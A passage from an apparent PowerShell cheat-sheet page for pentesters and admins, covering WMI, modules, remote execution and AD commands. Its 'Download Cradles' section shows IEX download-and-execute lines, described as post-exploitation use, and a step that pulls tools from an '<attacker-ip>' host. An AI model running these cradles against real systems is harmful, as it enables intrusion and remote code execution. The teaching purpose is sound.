+<p>See <a href="/knowledge/Defensive-Security/Log-Fundamentals">Log Fundamentals</a> for key event IDs. Refer to <a href="https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/">https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/</a> for the full event ID encyclopedia.</p>
+<p>More Get-WinEvent examples: <a href="https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/">https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/</a></p>
+<h3 id="wmi-cmdlets">WMI Cmdlets</h3>
+<p>WMI provides deep access to hardware, OS, processes, services, and configuration. <code>Get-CimInstance</code> is the modern replacement for <code>Get-WmiObject</code>.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-WmiObject -Class Win32_OperatingSystem</code></td><td>Detailed OS information</td></tr><tr><td><code>Get-WmiObject -Class Win32_OperatingSystem | select Version,BuildNumber</code></td><td>Quick OS version check</td></tr><tr><td><code>Get-WmiObject -Class Win32_Process</code></td><td>All running processes</td></tr><tr><td><code>Get-WmiObject -Class Win32_Service</code></td><td>All services</td></tr><tr><td><code>Get-WmiObject -Class Win32_Bios</code></td><td>BIOS information</td></tr><tr><td><code>Get-WmiObject -Class Win32_UserAccount</code></td><td>Local user accounts</td></tr><tr><td><code>Get-WmiObject -Class Win32_ComputerSystem</code></td><td>Computer name, domain, manufacturer</td></tr><tr><td><code>Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled}</code></td><td>Active network adapters with IP config</td></tr><tr><td><code>Get-CimInstance -ClassName Win32_OperatingSystem</code></td><td>Modern equivalent of Get-WmiObject</td></tr><tr><td><code>Invoke-WmiMethod -Path "CIM_DataFile.Name='&#x3C;src>'" -Name Rename -ArgumentList "&#x3C;dst>"</code></td><td>Rename a file via WMI (return 0 = success)</td></tr></tbody></table>
+<h3 id="download-cradles--web-interaction">Download Cradles &#x26; Web Interaction</h3>
+<p>Load and execute scripts in memory without writing to disk — commonly used in post-exploitation.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Command</th></tr></thead><tbody><tr><td>Download and execute from URL</td><td><code>IEX (New-Object Net.WebClient).DownloadString('http://&#x3C;host>/script.ps1')</code></td></tr><tr><td>Download file to disk (WebClient)</td><td><code>(New-Object Net.WebClient).DownloadFile('http://&#x3C;host>/file', 'C:\path\file')</code></td></tr><tr><td>Invoke-WebRequest (download)</td><td><code>Invoke-WebRequest -Uri 'http://&#x3C;host>/file' -OutFile C:\path\file</code></td></tr><tr><td>Load local script into memory</td><td><code>IEX (Get-Content .\script.ps1 -Raw)</code></td></tr><tr><td>Import module and run</td><td><code>Import-Module .\PowerView.ps1</code> then call functions directly</td></tr><tr><td>Inline execution after import</td><td><code>.\PowerView.ps1; Get-LocalGroup | fl</code></td></tr></tbody></table>
+<p><code>Invoke-WebRequest</code> (aliased as <code>wget</code>, <code>iwr</code>, <code>curl</code>) supports GET, POST, file download, authentication, and session management.</p>
+<p>Inspect the response object with <code>Get-Member</code>:
+<code>Invoke-WebRequest -Uri "http://&#x3C;target>" -Method GET | Get-Member</code></p>
+<p>Show only images from a page: <code>Invoke-WebRequest -Uri "http://&#x3C;target>" -Method GET | fl Images</code></p>
+<p>Serving files from an attack machine (Linux) for download on target:
+<code>python3 -m http.server 8000</code> → then download with <code>Invoke-WebRequest -Uri "http://&#x3C;attacker-ip>:8000/tool.ps1" -OutFile "C:\tool.ps1"</code></p>
+<h3 id="permissions--acls">Permissions &#x26; ACLs</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Acl -Path &#x3C;path></code></td><td>View ACL on a file or directory</td></tr><tr><td><code>Get-Acl -Path &#x3C;path> | Format-List</code></td><td>Full formatted ACL output</td></tr><tr><td><code>Get-Acl -Path HKLM:\System\CurrentControlSet\Services\&#x3C;svc> | Format-List</code></td><td>View ACL on a registry service key</td></tr></tbody></table>
+<h3 id="module-management">Module Management</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>List all modules currently loaded in the session</td></tr><tr><td><code>Get-Module -ListAvailable</code></td><td>Show all modules installed but not yet imported</td></tr><tr><td><code>Import-Module &#x3C;path or name></code></td><td>Load a module into the current session (enables its cmdlets)</td></tr><tr><td><code>$env:PSModulePath</code></td><td>Show the directories PowerShell searches for modules</td></tr><tr><td><code>Find-Module -Name "&#x3C;name>"</code></td><td>Search PowerShell Gallery for a module</td></tr><tr><td><code>Install-Module -Name "&#x3C;name>"</code></td><td>Download and install a module from PowerShell Gallery (requires admin)</td></tr></tbody></table>
+<p>Add a module file to <code>C:\Users\&#x3C;user>\Documents\WindowsPowerShell\Modules\</code> to make it permanently available.</p>
+<p>Module file extensions:</p>
+<ul>
+<li><code>.ps1</code> — executable PowerShell script</li>
+<li><code>.psm1</code> — PowerShell module file; defines what functions a module contains</li>
+<li><code>.psd1</code> — PowerShell data file; module manifest with metadata (version, author, dependencies, exports)</li>
+</ul>
+<h4 id="notable-powershell-modules-for-pentesters">Notable PowerShell Modules for Pentesters</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Module</th><th>Purpose</th></tr></thead><tbody><tr><td><code>ActiveDirectory</code></td><td>Official Microsoft module for managing AD users, groups, and computers</td></tr><tr><td><code>AdminToolbox</code></td><td>Community collection for sysadmins (AD, Exchange, network management)</td></tr><tr><td><code>Empire / Situational Awareness</code></td><td>Post-exploitation framework; provides C2 and enumeration capabilities</td></tr><tr><td><code>Inveigh</code></td><td>Network spoofing and MitM attacks (LLMNR/NBT-NS poisoning)</td></tr><tr><td><code>BloodHound / SharpHound</code></td><td>AD environment visualization; maps attack paths using graph analysis</td></tr></tbody></table>
+<p>PowerShell Gallery: <a href="https://www.powershellgallery.com/">https://www.powershellgallery.com/</a></p>
+<h3 id="remote-execution">Remote Execution</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Invoke-Command -ComputerName &#x3C;host> -ScriptBlock { &#x3C;command> }</code></td><td>Execute a command on a remote host via WinRM</td></tr><tr><td><code>Enter-PSSession -ComputerName &#x3C;host> -Credential &#x3C;user> -Authentication Negotiate</code></td><td>Start an interactive PowerShell session on a remote host</td></tr><tr><td><code>Test-WSMan -ComputerName &#x3C;host></code></td><td>Check if WinRM is reachable on a remote host (no authentication)</td></tr><tr><td><code>Test-WSMan -ComputerName &#x3C;host> -Authentication Negotiate</code></td><td>Test WinRM with authentication</td></tr></tbody></table>
+<p><code>Enter-PSSession</code> can also be used from Linux if PowerShell Core is installed. Once connected to a Windows CMD session via SSH, type <code>powershell</code> to upgrade to a PowerShell session.</p>
+<p>WinRM hardening recommendations: restrict <code>TrustedHosts</code> to specific IPs, enforce HTTPS transport, and use Kerberos authentication on domain-joined systems. See <a href="/knowledge/Operating-Systems/Windows/Windows-Remote-Management">Windows Remote Management</a>.</p>
+<h3 id="active-directory-commands">Active Directory Commands</h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Set-ADAccountPassword &#x3C;user> -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</code></td><td>Reset a user’s AD password</td></tr><tr><td><code>Set-ADUser -ChangePasswordAtLogon $true -Identity &#x3C;user> -Verbose</code></td><td>Force password reset at next logon</td></tr><tr><td><code>gpupdate /force</code></td><td>Force sync of Group Policy Objects on a computer</td></tr></tbody></table>
+<h3 id="scripting--automation">Scripting &#x26; Automation</h3>
+<h4 id="scripts-vs-modules">Scripts vs Modules</h4>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th></th><th>Script</th><th>Module</th></tr></thead><tbody><tr><td>File type</td><td><code>.ps1</code></td><td><code>.psm1</code> (main) + <code>.psd1</code> (manifest)</td></tr><tr><td>Contains</td><td>Individual cmdlets and functions</td><td>Collection of scripts, functions, manifests, resources</td></tr><tr><td>Usage</td><td>Run directly with <code>.\script.ps1</code></td><td>Imported with <code>Import-Module</code> then call its functions</td></tr></tbody></table>
+<p>A module is a packaged collection — it can include multiple script files, a manifest defining dependencies and exports, and help documentation.</p>
+<h4 id="module-structure">Module Structure</h4>
+<p>A PowerShell module requires four components:</p>
+<ol>
+<li>A directory in <code>$env:PSModulePath</code> containing all files</li>
+<li>A <code>.psd1</code> manifest declaring metadata, prerequisites, and exports</li>
+<li>A <code>.psm1</code> code file with functions and logic</li>
+<li>Optional: help files, additional scripts, and resources</li>
+</ol>
+<p>Create a manifest: <code>New-ModuleManifest -Path &#x3C;path.psd1> -PassThru</code></p>
+<p>The <code>-PassThru</code> flag displays the generated manifest content immediately. Only <code>ModuleVersion</code> is required; all other fields are optional.</p>
+<h4 id="running-scripts">Running Scripts</h4>
+<ul>
+<li>Run a script file directly: <code>.\scriptname.ps1</code></li>
+<li>Import a module for the session: <code>Import-Module .\module.psm1</code></li>
+<li>Inline execution: <code>.\module.ps1; Invoke-FunctionName</code></li>
+</ul>
+<p>See the Execution Policy section above for bypassing script execution restrictions.</p>
+<hr>
+<h2 id="related-concepts">Related Concepts</h2>
+<ul>
+<li><a href="/knowledge/Operating-Systems/Windows/Windows-Fundamentals">Windows Fundamentals</a></li>
+<li><a href="/knowledge/Operating-Systems/Windows/Windows-Command-Line">Windows Command Line</a></li>
+<li><a href="/knowledge/Operating-Systems/Windows/Windows-Event-Logs">Windows Event Logs</a></li>
+<li><a href="/knowledge/Operating-Systems/Windows/Active-Directory/Active-Directory-Basics">Active Directory Basics</a></li>
+<li><a href="/knowledge/Defensive-Security/Log-Fundamentals">Log Fundamentals</a></li>
+<li><a href="/knowledge/Operating-Systems/Windows/Windows-Remote-Management">Windows Remote Management</a></li>
+</ul>
+<h2 id="related-techniques">Related Techniques</h2>
+<ul>
+<li><a href="/playbooks/Windows-Pentest-Playbook">Windows Pentest Playbook</a></li>
+</ul>
+<h2 id="related-tools">Related Tools</h2>
+<ul>
+<li><a href="/tools/Defense-Monitoring/Sysmon">Sysmon</a></li>
+</ul>
+<hr>
+<h2 id="references--images">References / Images</h2>
+<ul>
+<li>Microsoft PowerShell Documentation: <a href="https://learn.microsoft.com/en-us/powershell/">https://learn.microsoft.com/en-us/powershell/</a></li>
+<li>Active Directory PowerShell module documentation</li>
+<li><a href="https://www.powershellgallery.com/">https://www.powershellgallery.com/</a> — PowerShell module repository</li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators</a> — Full comparison operator reference</li>
+<li><a href="https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/">https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/</a> — Get-WinEvent examples</li>
+<li><a href="https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/">https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/</a> — Execution policy bypass techniques</li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles</a> — PowerShell profile locations</li>
+</ul>  </div> </main> <aside class="toc" id="toc" data-astro-cid-o5gmpz7g> <div class="toc-inner" data-astro-cid-o5gmpz7g> <p class="toc-label" data-astro-cid-o5gmpz7g>On this page</p> <aside id="toc-container"> <a href="#overview" class="toc-link toc-h2" data-heading="overview"> Overview </a><a href="#terminology" class="toc-link toc-h2" data-heading="terminology"> Terminology </a><a href="#core-concepts" class="toc-link toc-h2" data-heading="core-concepts"> Core Concepts </a><a href="#accessing-powershell" class="toc-link toc-h3" data-heading="accessing-powershell"> Accessing PowerShell </a><a href="#getting-started" class="toc-link toc-h3" data-heading="getting-started"> Getting Started </a><a href="#command-history" class="toc-link toc-h3" data-heading="command-history"> Command History </a><a href="#hotkeys" class="toc-link toc-h4" data-heading="hotkeys"> Hotkeys </a><a href="#file-system-management" class="toc-link toc-h3" data-heading="file-system-management"> File System Management </a><a href="#powershell-objects" class="toc-link toc-h3" data-heading="powershell-objects"> PowerShell Objects </a><a href="#piping-filtering-and-sorting" class="toc-link toc-h3" data-heading="piping-filtering-and-sorting"> Piping, Filtering, and Sorting </a><a href="#finding-files-recursively" class="toc-link toc-h4" data-heading="finding-files-recursively"> Finding Files Recursively </a><a href="#pentest-recon--valuable-locations" class="toc-link toc-h3" data-heading="pentest-recon--valuable-locations"> Pentest Recon — Valuable Locations </a><a href="#system-information--analysis" class="toc-link toc-h3" data-heading="system-information--analysis"> System Information &amp; Analysis </a><a href="#networking" class="toc-link toc-h3" data-heading="networking"> Networking </a><a href="#user--group-management" class="toc-link toc-h3" data-heading="user--group-management"> User &amp; Group Management </a><a href="#local-users" class="toc-link toc-h4" data-heading="local-users"> Local Users </a><a href="#domain-users-requires-rsat-activedirectory-module" class="toc-link toc-h4" data-heading="domain-users-requires-rsat-activedirectory-module"> Domain Users (requires RSAT ActiveDirectory module) </a><a href="#service-management" class="toc-link toc-h3" data-heading="service-management"> Service Management </a><a href="#remote-service-management" class="toc-link toc-h4" data-heading="remote-service-management"> Remote Service Management </a><a href="#scheduled-tasks" class="toc-link toc-h3" data-heading="scheduled-tasks"> Scheduled Tasks </a><a href="#working-with-the-registry" class="toc-link toc-h3" data-heading="working-with-the-registry"> Working with the Registry </a><a href="#registry-hives" class="toc-link toc-h4" data-heading="registry-hives"> Registry Hives </a><a href="#reading-the-registry" class="toc-link toc-h4" data-heading="reading-the-registry"> Reading the Registry </a><a href="#searching-the-registry-regexe" class="toc-link toc-h4" data-heading="searching-the-registry-regexe"> Searching the Registry (reg.exe) </a><a href="#creating-and-modifying-registry-keys" class="toc-link toc-h4" data-heading="creating-and-modifying-registry-keys"> Creating and Modifying Registry Keys </a><a href="#execution-policy" class="toc-link toc-h3" data-heading="execution-policy"> Execution Policy </a><a href="#windows-event-log--get-winevent" class="toc-link toc-h3" data-heading="windows-event-log--get-winevent"> Windows Event Log — Get-WinEvent </a><a href="#basic-queries" class="toc-link toc-h4" data-heading="basic-queries"> Basic Queries </a><a href="#reading-evtx-files" class="toc-link toc-h4" data-heading="reading-evtx-files"> Reading .evtx Files </a><a href="#filterhashtable--efficient-server-side-filtering" class="toc-link toc-h4" data-heading="filterhashtable--efficient-server-side-filtering"> FilterHashtable — Efficient Server-Side Filtering </a><a href="#filterxml--structured-xml-queries" class="toc-link toc-h4" data-heading="filterxml--structured-xml-queries"> FilterXML — Structured XML Queries </a><a href="#filterxpath--xpath-based-field-filtering" class="toc-link toc-h4" data-heading="filterxpath--xpath-based-field-filtering"> FilterXPath — XPath-Based Field Filtering </a><a href="#parsing-event-xml--extracting-specific-fields" class="toc-link toc-h4" data-heading="parsing-event-xml--extracting-specific-fields"> Parsing Event XML — Extracting Specific Fields </a><a href="#property-based-filtering" class="toc-link toc-h4" data-heading="property-based-filtering"> Property-Based Filtering </a><a href="#wmi-cmdlets" class="toc-link toc-h3" data-heading="wmi-cmdlets"> WMI Cmdlets </a><a href="#download-cradles--web-interaction" class="toc-link toc-h3" data-heading="download-cradles--web-interaction"> Download Cradles &amp; Web Interaction </a><a href="#permissions--acls" class="toc-link toc-h3" data-heading="permissions--acls"> Permissions &amp; ACLs </a><a href="#module-management" class="toc-link toc-h3" data-heading="module-management"> Module Management </a><a href="#notable-powershell-modules-for-pentesters" class="toc-link toc-h4" data-heading="notable-powershell-modules-for-pentesters"> Notable PowerShell Modules for Pentesters </a><a href="#remote-execution" class="toc-link toc-h3" data-heading="remote-execution"> Remote Execution </a><a href="#active-directory-commands" class="toc-link toc-h3" data-heading="active-directory-commands"> Active Directory Commands </a><a href="#scripting--automation" class="toc-link toc-h3" data-heading="scripting--automation"> Scripting &amp; Automation </a><a href="#scripts-vs-modules" class="toc-link toc-h4" data-heading="scripts-vs-modules"> Scripts vs Modules </a><a href="#module-structure" class="toc-link toc-h4" data-heading="module-structure"> Module Structure </a><a href="#running-scripts" class="toc-link toc-h4" data-heading="running-scripts"> Running Scripts </a> </aside> </div> </aside> <div class="note-spacer" data-astro-cid-o5gmpz7g></div> </div>  </div> </body></html>  <script type="module">const e=document.getElementById("sidebar-toggle"),l=document.getElementById("sidebar");if(e&&l){let a=function(o){o?(l.setAttribute("data-collapsed",""),e.textContent="›",e.style.left="0px"):(l.removeAttribute("data-collapsed"),e.textContent="‹",e.style.left="240px")},t=localStorage.getItem("sidebar")==="1";a(t),e.addEventListener("click",()=>{t=!t,localStorage.setItem("sidebar",t?"1":"0"),a(t)})}</script> <script type="module">window.addEventListener("DOMContentLoaded",()=>{const c=document.querySelectorAll(".toc-link[data-heading]");if(!c.length)return;const d=["related concepts","related techniques","related tools","related playbooks","related knowledge","references","references / images","references/images"],o=Array.from(document.querySelectorAll(".note-content h1, .note-content h2, .note-content h3, .note-content h4")).filter(e=>{if(!e.id)return!1;const t=e.textContent.trim().toLowerCase();return!d.some(n=>t.includes(n))});if(!o.length)return;function r(e){c.forEach(n=>{n.classList.toggle("active",n.dataset.heading===e)});const t=document.querySelector(`.toc-link[data-heading="${e}"]`);t&&t.scrollIntoView({block:"nearest",behavior:"smooth"})}function i(){const e=window.scrollY,t=document.documentElement.scrollHeight,n=window.innerHeight,a=100;if(e+n>=t-10){r(o[o.length-1].id);return}let s=o[0];for(const l of o)l.getBoundingClientRect().top<=a&&(s=l);r(s.id)}window.addEventListener("scroll",i,{passive:!0}),i()});</script>
